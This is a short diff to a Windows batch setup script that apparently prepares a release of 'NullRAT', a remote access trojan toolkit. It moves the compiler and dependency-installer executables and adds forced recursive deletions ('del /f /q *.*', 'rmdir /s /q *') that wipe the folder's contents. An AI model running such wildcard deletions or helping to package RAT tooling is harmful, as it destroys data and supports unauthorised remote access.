@@ -12,7 +12,9 @@ move "3) NullRAT Compiler".exe "%~dp0\temp"
 move "2) NullRAT DepInst".exe "%~dp0\temp"
 if exist README.md (del README.md)
 if exist .git\ (rmdir /s /q .git\)
-del /f /q *.* & cd "%~dp0\temp"
+del /f /q *.* 
+rmdir /s /q * & rmdir /s /q build\
+cd "%~dp0\temp"
 move * "%~dp0\" & cd "%~dp0\"
 rmdir /s /q "%~dp0\temp"
 attrib -h "%~nx0"
